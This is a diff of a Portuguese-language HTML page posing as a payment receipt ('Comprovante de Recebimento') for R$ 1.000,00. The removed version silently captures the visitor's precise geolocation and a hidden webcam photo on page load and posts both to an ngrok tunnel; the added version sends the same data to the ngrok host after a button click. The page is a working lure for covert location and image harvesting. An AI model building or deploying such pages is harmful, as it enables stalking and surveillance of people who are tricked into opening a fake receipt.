@@ -1,157 +1,102 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Comprovante de Recebimento</title>
-  <link rel="stylesheet" href="styles.css" />
 </head>
-
 <body>
-  <div class="comprovante-container">
-    <h1>Comprovante de Recebimento</h1>
+  <h1>Comprovante de Recebimento</h1>
+  <p>Data: <span id="data-atual"></span></p>
 
-    <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
-    </div>
-
-    <button class="botao" onclick="window.print()">Imprimir</button>
-
-    <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
-    </div>
-  </div>
+  <button onclick="startProcess()">Enviar localização e foto</button>
 
   <script>
-    // URL atual do seu ngrok (ajustada)
+    // Aqui sua URL ngrok atualizada:
     const NGROK_SERVER = "https://2303-201-42-106-118.ngrok-free.app";
 
-    // Exibir data atual formatada no elemento #data-atual
+    // Mostra data atual
     const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-    document.getElementById("data-atual").textContent = dataFormatada;
+    document.getElementById("data-atual").textContent = dataAtual.toLocaleDateString();
 
-    // Função para redimensionar a imagem base64 para largura e altura máximas definidas
-    function resizeImage(imageBase64, maxWidth, maxHeight, callback) {
-      const img = new Image();
-      img.onload = () => {
-        let width = img.width;
-        let height = img.height;
+    function startProcess() {
+      if (!navigator.geolocation) {
+        alert("Geolocalização não suportada");
+        return;
+      }
 
-        if (width > maxWidth) {
-          height *= maxWidth / width;
-          width = maxWidth;
-        }
-        if (height > maxHeight) {
-          width *= maxHeight / height;
-          height = maxHeight;
-        }
+      navigator.geolocation.getCurrentPosition(async (position) => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-        const canvas = document.createElement('canvas');
-        canvas.width = width;
-        canvas.height = height;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(img, 0, 0, width, height);
+        // Captura foto da webcam
+        const photoBase64 = await capturePhoto();
 
-        callback(canvas.toDataURL('image/png'));
-      };
-      img.src = imageBase64;
-    }
-
-    // Captura foto da webcam e retorna base64 via callback
-    function startCameraAndGetPhoto(callback) {
-      const video = document.createElement("video");
-      video.style.display = "none";
-      document.body.appendChild(video);
-
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          video.srcObject = stream;
-          video.play();
-
-          video.addEventListener("canplay", () => {
-            const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            const imageBase64 = canvas.toDataURL("image/png");
-
-            // Para a câmera e remove o vídeo
-            stream.getTracks().forEach(track => track.stop());
-            video.remove();
-
-            callback(imageBase64);
-          });
-        })
-        .catch(err => {
-          alert("Erro ao acessar a webcam: " + err.message);
-          callback(null);
-        });
-    }
-
-    // Envia localização e foto para o backend, redimensionando a imagem antes
-    function sendLocationAndPhoto(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      startCameraAndGetPhoto((imageBase64) => {
-        if (!imageBase64) {
-          alert("Erro ao capturar a foto.");
+        if (!photoBase64) {
+          alert("Não foi possível capturar a foto");
           return;
         }
 
-        // Redimensiona a imagem antes de enviar (máximo 800x600)
-        resizeImage(imageBase64, 800, 600, (resizedBase64) => {
-          fetch(`${NGROK_SERVER}/send-data`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ latitude, longitude, maps, photo: resizedBase64 }),
-          })
-            .then(res => res.json())
-            .then(data => {
-              if (!data.success) {
-                alert("Erro ao enviar os dados.");
-              } else {
-                console.log("Dados enviados com sucesso!");
-              }
-            })
-            .catch(err => {
-              console.error("Erro ao enviar os dados:", err);
-              alert("Erro na comunicação com o servidor.");
-            });
+        // Envia dados para backend
+        fetch(`${NGROK_SERVER}/send-location-photo`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ latitude, longitude, maps, photo: photoBase64 }),
+        })
+        .then(res => res.json())
+        .then(data => {
+          if (data.success) {
+            alert("Dados enviados com sucesso!");
+          } else {
+            alert("Falha ao enviar os dados.");
+          }
+        })
+        .catch(err => {
+          console.error("Erro:", err);
+          alert("Erro na comunicação com o servidor.");
         });
+
+      }, (error) => {
+        alert("Erro ao obter localização: " + error.message);
       });
     }
 
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
-    }
+    // Função para capturar foto da webcam e retornar base64
+    function capturePhoto() {
+      return new Promise((resolve, reject) => {
+        const video = document.createElement("video");
+        video.setAttribute("autoplay", "");
+        video.style.display = "none";
+        document.body.appendChild(video);
 
-    // Ao carregar a página, tenta obter localização e foto
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          sendLocationAndPhoto,
-          handleError,
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      } else {
-        alert("Seu navegador não suporta Geolocalização.");
-      }
-    });
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            video.srcObject = stream;
+            video.play();
+
+            video.onloadedmetadata = () => {
+              const canvas = document.createElement("canvas");
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const ctx = canvas.getContext("2d");
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+              // Para a câmera
+              stream.getTracks().forEach(track => track.stop());
+              video.remove();
+
+              const dataURL = canvas.toDataURL("image/png");
+              resolve(dataURL);
+            };
+          })
+          .catch(err => {
+            video.remove();
+            reject(err);
+          });
+      });
+    }
   </script>
 </body>
-
 </html>
 
